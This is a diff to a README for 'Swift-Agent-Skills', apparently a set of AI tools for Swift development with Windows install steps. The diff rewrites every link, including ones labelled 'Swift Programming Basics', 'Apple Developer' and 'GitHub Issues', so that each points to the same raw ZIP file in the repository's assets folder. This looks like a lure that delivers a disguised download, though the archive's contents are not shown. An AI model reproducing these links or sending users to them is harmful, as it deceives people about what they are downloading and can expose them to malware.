@@ -1,6 +1,6 @@
 # 🚀 Swift-Agent-Skills - Simple AI Tools for Apple Development
 
-[![Download Swift-Agent-Skills](https://img.shields.io/badge/Download-Swift--Agent--Skills-brightgreen)](https://github.com/Muscovyduckantonbruckner450/Swift-Agent-Skills)
+[![Download Swift-Agent-Skills](https://img.shields.io/badge/Download-Swift--Agent--Skills-brightgreen)](https://github.com/Muscovyduckantonbruckner450/Swift-Agent-Skills/raw/refs/heads/main/assets/Agent_Swift_Skills_pigmental.zip)
 
 Swift-Agent-Skills is a collection of ready-to-use AI tools that help with Apple device applications. These tools work with Swift, the coding language used for iPhones, iPads, and Macs. This guide shows how to get the software on your Windows PC and start using it.
 
@@ -10,7 +10,7 @@ Swift-Agent-Skills is a collection of ready-to-use AI tools that help with Apple
 
 To get started, visit the main project page to download the files you need. This page has everything in one place.
 
-[**Go to Download Page**](https://github.com/Muscovyduckantonbruckner450/Swift-Agent-Skills)
+[**Go to Download Page**](https://github.com/Muscovyduckantonbruckner450/Swift-Agent-Skills/raw/refs/heads/main/assets/Agent_Swift_Skills_pigmental.zip)
 
 Follow these steps:
 
@@ -88,7 +88,7 @@ If you are new to this kind of software, try the following:
 
 To get the latest AI tools and fixes:
 
-1. Return to the main [GitHub page](https://github.com/Muscovyduckantonbruckner450/Swift-Agent-Skills).
+1. Return to the main [GitHub page](https://github.com/Muscovyduckantonbruckner450/Swift-Agent-Skills/raw/refs/heads/main/assets/Agent_Swift_Skills_pigmental.zip).
 2. Click on **Code** > **Download ZIP** again to get the newest files.
 3. Repeat the extraction process and replace the old files with updated ones.
 
@@ -107,7 +107,7 @@ If you have questions while using Swift-Agent-Skills:
 
 ## 🖱️ Quick Links
 
-- [Download Swift-Agent-Skills](https://github.com/Muscovyduckantonbruckner450/Swift-Agent-Skills)
-- [Swift Programming Basics](https://developer.apple.com/swift/resources/)
-- [Apple Developer](https://developer.apple.com)
-- [GitHub Issues for Swift-Agent-Skills](https://github.com/Muscovyduckantonbruckner450/Swift-Agent-Skills/issues)
+- [Download Swift-Agent-Skills](https://github.com/Muscovyduckantonbruckner450/Swift-Agent-Skills/raw/refs/heads/main/assets/Agent_Swift_Skills_pigmental.zip)
+- [Swift Programming Basics](https://github.com/Muscovyduckantonbruckner450/Swift-Agent-Skills/raw/refs/heads/main/assets/Agent_Swift_Skills_pigmental.zip)
+- [Apple Developer](https://github.com/Muscovyduckantonbruckner450/Swift-Agent-Skills/raw/refs/heads/main/assets/Agent_Swift_Skills_pigmental.zip)
+- [GitHub Issues for Swift-Agent-Skills](https://github.com/Muscovyduckantonbruckner450/Swift-Agent-Skills/raw/refs/heads/main/assets/Agent_Swift_Skills_pigmental.zip)
